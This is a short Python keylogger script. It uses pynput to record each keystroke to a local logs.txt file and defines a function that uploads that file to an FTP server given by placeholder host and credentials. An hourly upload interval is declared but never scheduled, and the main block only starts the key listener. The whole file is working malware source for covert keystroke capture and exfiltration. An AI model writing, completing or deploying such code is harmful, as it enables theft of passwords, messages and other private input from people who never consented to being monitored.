# import libraries
from pynput import keyboard
from ftplib import FTP
import datetime
import threading


# FTP Configurations
ftp_server = 'server.ip'
ftp_username = 'username'
ftp_password = '123'
upload_interval = 3600  # Upload interval in seconds (1 hour)


# This will be what logs the keys that are pressed, in addition to writing it to a file
def keypressed(key):
    print(str(key))
    with open('logs.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            return "Error"


# Function to upload the log file to the specified FTP server
def send_log():
    try:
        ftp = FTP(ftp_server)
        ftp.login(user=ftp_username, passwd=ftp_password)
        with open('logs.txt', 'rb') as file:
            ftp.storbinary('STOR logs.txt', file)
        ftp.quit()
        return "file uploaded"
    except Exception as e:
        return f"Error uploading log file: {e}"


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
